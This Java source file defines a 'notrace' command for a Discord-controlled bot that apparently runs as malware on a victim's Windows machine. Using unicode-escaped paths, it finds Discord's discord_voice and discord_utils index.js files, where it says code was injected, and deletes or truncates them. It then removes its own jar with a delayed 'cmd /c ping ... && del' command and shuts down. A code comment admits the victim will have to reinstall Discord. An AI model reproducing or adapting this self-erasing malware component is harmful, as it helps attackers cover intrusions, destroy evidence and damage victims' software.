package cmd;

import main.Bot;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;

import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Objects;

public class NoTrace extends Command {
    public NoTrace(){
        this.name = "notrace";
        this.usage = "/notrace";
        this.desc = "";
        this.type = CommandType.GENERAL;
    }

    @Override
    public boolean onCommand(User user, Message message, String[] args) { // im sorry man if you read this i was too lazy to write code that removes the injected code you'll have to reinstall discord :)
        String dc = System.getenv("LOCALAPPDATA")+"\\\u0044\u0069\u0073\u0063\u006f\u0072\u0064";
        for(String l : Objects.requireNonNull(new File(dc).list())){
            if (l.contains("app-")){
                dc+="\\"+l+"\\modules";
                for(String _l : Objects.requireNonNull(new File(dc).list())){
                    if (_l.contains("\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u005f\u0076\u006f\u0069\u0063\u0065"))
                        dc+="\\"+_l+"\\\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u005f\u0076\u006f\u0069\u0063\u0065\\\u0069\u006e\u0064\u0065\u0078\u002e\u006a\u0073";
                    else if (_l.contains("discord_utils"))
                        dc+="\\"+_l+"\\\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u005f\u0075\u0074\u0069\u006c\u0073\\\u0069\u006e\u0064\u0065\u0078\u002e\u006a\u0073";

                    final File file = new File(dc);
                    if (!file.delete()){
                        try {
                            Files.write(Paths.get(dc), "L".getBytes(), StandardOpenOption.TRUNCATE_EXISTING); } catch (IOException e) { }
                        file.deleteOnExit();
                    }

                }
                break;
            }
        }
        try { Runtime.getRuntime().exec("cmd /c ping localhost -n 6 > nul && del "+new File(NoTrace.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath()); } catch (IOException | URISyntaxException eee) { message.getChannel().sendMessage("jar deletion failed").queue();}
        message.getChannel().sendMessage("```goodnight friend :,(```").queue();
        Bot.shutdown();
        return true;
    }
}
